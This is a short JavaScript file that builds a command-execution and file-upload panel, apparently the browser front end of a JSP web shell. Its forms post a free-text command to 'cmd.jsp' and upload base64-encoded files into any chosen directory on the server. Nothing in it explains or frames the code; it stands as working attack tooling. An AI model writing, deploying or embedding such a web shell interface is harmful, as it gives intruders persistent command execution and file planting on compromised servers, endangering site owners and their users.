document.write("<p>");
var html = "<form method=post action='cmd.jsp'>\
<input name='c' type=text><input type=submit value='Run'>\
</form><hr>\
<form action='cmd.jsp' method=post>\
Upload dir: <input name='a' type=text value='.'><br>\
Select a file to upload: <input name='n' type='file' id='f'>\
<input type='hidden' name='b' id='b'>\
<input type='submit' value='Upload'>\
</form><hr>";
var div = document.createElement('div');
div.innerHTML = html;
document.body.insertBefore(div, document.body.firstChild);

var handleFileSelect = function(evt) {
    var files = evt.target.files;
    var file = files[0];

    if (files && file) {
        var reader = new FileReader();

        reader.onload = function(readerEvt) {
            var binaryString = readerEvt.target.result;
            document.getElementById('b').value = btoa(binaryString);
        };

        reader.readAsBinaryString(file);
    }
};
if (window.File && window.FileReader && window.FileList && window.Blob) {
    document.getElementById('f').addEventListener('change', handleFileSelect, false);
} else {
    alert('The File APIs are not fully supported in this browser.');
}